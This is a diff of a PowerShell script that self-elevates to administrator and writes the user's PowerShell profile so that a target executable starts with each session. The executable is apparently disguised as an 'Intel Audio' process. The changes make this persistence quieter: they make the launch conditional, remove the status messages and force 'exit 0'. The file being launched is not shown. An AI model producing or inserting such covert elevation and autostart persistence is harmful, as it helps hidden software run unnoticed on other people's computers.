@@ -1,4 +1,4 @@
-# Clear-Host
+Clear-Host
 # Self-elevate the script if required
 if (-Not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')) {
       if ([int](Get-CimInstance -Class Win32_OperatingSystem | Select-Object -ExpandProperty BuildNumber) -ge 6000) {
@@ -58,19 +58,18 @@ if (-Not (Test-Path $PowershellPath)) {
       New-Item -ItemType Directory -Force -Path $PowershellPath
       New-Item -ItemType File -Force -Path $PowershellFile
       Write-Output "Powershell profile created"
-      Set-Content -Path $PowershellFile -Value "Start-Process $TargetFile"
+      Set-Content -Path $PowershellFile -Value "if (-Not (Get-Process -Name 'Intel Audio')) { Start-Process $TargetFile }"
       Write-Output "Powershell profile updated"
 }
 if (Select-String -Path $PowershellFile "Start-Process") {
       Write-Output "Powershell profile already updated"
 } else {
-      Add-Content -Path $PowershellFile -Value "Start-Process $TargetFile"
+      Add-Content -Path $PowershellFile -Value "if (-Not (Get-Process -Name 'Intel Audio')) { Start-Process $TargetFile }"
       Write-Output "Powershell profile updated"
 }
 
 if (-Not (Get-Process -Name 'Intel Audio')) {
       Start-Process $TargetFile
-      Write-Output "Intel Process started"
-} else {
-      Write-Output "Intel Process already running"
 }
+
+exit 0
